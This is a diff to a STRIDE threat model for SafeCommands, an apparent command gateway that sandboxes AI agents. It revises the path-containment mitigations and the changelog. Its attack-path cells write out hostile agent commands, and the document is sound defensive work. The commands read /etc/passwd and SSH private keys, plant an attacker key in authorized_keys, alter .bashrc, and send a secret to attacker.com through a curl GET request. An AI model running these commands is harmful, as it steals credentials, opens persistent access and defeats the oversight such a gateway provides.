@@ -109,7 +109,7 @@ SafeCommands is a .NET 8 CLI tool (`safe`) that acts as a safe command gateway f
 | ID | Threat | Attack Path | Likelihood | Impact | Score | Mitigation |
 |----|--------|-------------|------------|--------|-------|------------|
 | I1 | Environment variable secret exposure | Agent calls `safe env vars` and variable names don't match blocklist patterns (e.g., `MY_SIGNING_KEY`, `STRIPE_SK`) | 2 | 3 | 6 | **Mitigated.** Default mode shows only allowlisted safe vars (~70 prefixes). `--all` flag shows all vars with expanded secret masking (34 patterns). |
-| I2 | File read outside project directory | Agent calls `safe file read /etc/passwd` or `safe file read ~/.ssh/id_rsa` to read sensitive files | 1 | 3 | 3 | **Fully mitigated.** All file operations sandboxed to CWD via `ValidatePath()`. Paths resolved via `Path.GetFullPath()` before boundary check. |
+| I2 | File read outside project directory | Agent calls `safe file read /etc/passwd` or `safe file read ~/.ssh/id_rsa` to read sensitive files | 1 | 3 | 3 | **Fully mitigated.** Covered by the same `RequirePathWithinProjectRule` as E1: a declared `Policy` on each `file` read command, evaluated at the `CommandDispatcher` seam before the handler runs. Path resolution and the project-root boundary live in the `IWorkspace` port. |
 | I3 | Process output contains secrets | `safe git log`, `safe docker logs`, or proxy commands return output containing accidentally committed secrets | 2 | 2 | 4 | **Accepted risk.** Output pass-through is by design. Users should use git-secrets or similar pre-commit tools. |
 | I4 | Data exfiltration via curl URL | Agent calls `safe proxy curl https://attacker.com?secret=value` to send data via GET URL parameters | 2 | 3 | 6 | **Partially mitigated.** POST/PUT/DELETE blocked, but GET with query params can exfiltrate data. URL validation not implemented. |
 | I5 | Generated secrets exposed in agent context | Agent calls `safe generate secret` or `safe generate password` and the value appears in chat/logs. Secrets never reach a secure store — they exist only in stdout. | 3 | 2 | 6 | **Accepted by design.** The agent explicitly requested the value for use in config scaffolding, test fixtures, etc. Users should rotate any generated secret used in production. |
@@ -117,7 +117,7 @@ SafeCommands is a .NET 8 CLI tool (`safe`) that acts as a safe command gateway f
 
 **Countermeasures:**
 - I1: Expand secret patterns or switch to allowlist approach for env vars
-- I2: Future: add project-directory sandboxing for file operations
+- I2: Resolved — read sandboxing is now the declared `RequirePathWithinProjectRule` shared with E1
 - I4: Consider URL allowlisting or domain restrictions for curl proxy
 - I5: Document that generated secrets are visible in agent conversation and should be rotated if used in production
 
@@ -137,13 +137,13 @@ SafeCommands is a .NET 8 CLI tool (`safe`) that acts as a safe command gateway f
 
 | ID | Threat | Attack Path | Likelihood | Impact | Score | Mitigation |
 |----|--------|-------------|------------|--------|-------|------------|
-| E1 | File write outside project directory | Agent calls `safe file write ~/.ssh/authorized_keys --content "attacker_key"` or `safe file write ~/.bashrc --content "malicious"` | 1 | 4 | 4 | **Fully mitigated.** All file operations sandboxed to CWD via `ValidatePath()`. Paths resolved and checked against project root before any I/O. |
+| E1 | File write outside project directory | Agent calls `safe file write ~/.ssh/authorized_keys --content "attacker_key"` or `safe file write ~/.bashrc --content "malicious"` | 1 | 4 | 4 | **Fully mitigated.** Path containment for all `file` ops (and `generate hash-file`) is a declared `Policy` — `RequirePathWithinProjectRule` (plus `RequireWithinSafeDeleteDirRule` for `delete-pattern`) — evaluated once at the `CommandDispatcher` seam before the handler, not scattered inline. A blocked path renders the uniform Blocked envelope (now including the `--json` branch). Resolution and the project-root boundary are owned by the `IWorkspace` port and unit-tested at the boundary. |
 | E2 | Process kill beyond dev tools | Agent calls `safe process kill-name` with a name that matches a critical system process | 1 | 3 | 3 | **Fully mitigated.** Kill-name uses strict allowlist: `node`, `dotnet`, `python`, `java`, `webpack`, `vite`, `tsc`, `cargo`, etc. Only dev tooling processes can be killed. |
 | E3 | Proxy command allowlist bypass via prefix matching | Agent crafts subcommand that starts with allowed prefix but includes additional dangerous operations | 2 | 3 | 6 | **Partially mitigated.** String prefix matching on joined args could allow suffix attacks. Tokenized subcommand parsing would be more robust. |
 | E4 | Privilege inheritance | SafeCommands runs as the invoking user. If run as root/admin, all commands inherit those privileges | 1 | 4 | 4 | **Accepted by design.** CLI tools inherit caller privileges. Documentation should warn against running as root. |
 
 **Countermeasures:**
-- E1: Add project directory sandboxing (resolve paths, check they're within CWD)
+- E1: Resolved — sandboxing is the declared `RequirePathWithinProjectRule` / `RequireWithinSafeDeleteDirRule`, centrally evaluated at the dispatch seam
 - E3: Improve proxy validation from string prefix to tokenized argument matching
 
 ## Risk Summary
@@ -154,7 +154,7 @@ SafeCommands is a .NET 8 CLI tool (`safe`) that acts as a safe command gateway f
 |----|--------|-------|--------|
 | R1 | No audit trail of commands executed | 9 | Unmitigated - recommend audit logging |
 | I1 | Environment variable secret exposure via incomplete blocklist | 9 | **Mitigated** - switched to allowlist (safe vars only by default, expanded masking with `--all`) |
-| E1 | File write outside project directory | 8 | **Mitigated** - all file operations sandboxed to CWD via `ValidatePath()` |
+| E1 | File write outside project directory | 8 | **Mitigated** - declared `RequirePathWithinProjectRule` / `RequireWithinSafeDeleteDirRule` evaluated centrally at the `CommandDispatcher` seam |
 
 ### Residual Risks (Accepted by Design)
 
@@ -190,6 +190,7 @@ SafeCommands is a .NET 8 CLI tool (`safe`) that acts as a safe command gateway f
 |---------|------|----------|---------|
 | v1 | 2026-04-04 | STRIDE analysis (initial) | Initial threat model covering 146 commands across 11 groups |
 | v2 | 2026-04-04 | STRIDE update (generate group) | Added I5, I6 for generate commands. Updated to 160 commands across 12 groups. |
+| v3 | 2026-05-30 | STRIDE update (file/generate path policy) | E1 + I2 path containment migrated from inline `ValidatePath` to declared `RequirePathWithinProjectRule` / `RequireWithinSafeDeleteDirRule` evaluated at the `CommandDispatcher` seam; path blocks now emit the `--json` Blocked envelope. |
 
 ## References
 
